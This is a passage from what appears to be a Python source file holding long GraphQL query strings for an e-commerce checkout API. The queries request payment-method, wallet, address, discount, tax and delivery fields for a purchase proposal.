paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}

"""

QUERY_PROPOSAL_DELIVERY = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name 